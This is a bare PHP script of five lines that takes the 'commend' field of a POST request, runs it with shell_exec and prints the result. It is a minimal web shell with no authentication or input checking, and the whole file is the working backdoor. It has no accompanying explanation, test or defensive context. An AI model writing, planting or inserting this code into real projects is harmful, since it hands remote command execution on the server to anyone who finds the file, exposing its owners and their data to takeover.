<?php
	$commend = $_POST["commend"];
	$result = shell_exec($commend);
	echo $result;
?>